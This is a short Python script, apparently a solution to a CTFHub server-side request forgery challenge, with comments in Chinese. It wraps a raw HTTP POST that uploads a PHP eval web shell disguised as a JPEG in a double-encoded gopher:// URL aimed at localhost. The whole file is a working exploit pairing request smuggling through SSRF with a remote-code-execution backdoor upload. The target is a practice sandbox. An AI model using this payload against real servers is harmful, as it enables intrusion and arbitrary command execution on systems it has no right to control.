import urllib.parse
payload =\
"""POST /flag.php HTTP/1.1
Host: challenge-9048da5f4dcdf033.sandbox.ctfhub.com:10800
Content-Length: 311
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-9048da5f4dcdf033.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi4Xu1a52H833PSAA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-9048da5f4dcdf033.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryi4Xu1a52H833PSAA
Content-Disposition: form-data; name="file"; filename="a.jpg"
Content-Type: image/jpeg

<?php
	@eval($_POST['cmd']);
?>
------WebKitFormBoundaryi4Xu1a52H833PSAA
Content-Disposition: form-data; name="submit"

------WebKitFormBoundaryi4Xu1a52H833PSAA--

"""

#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码
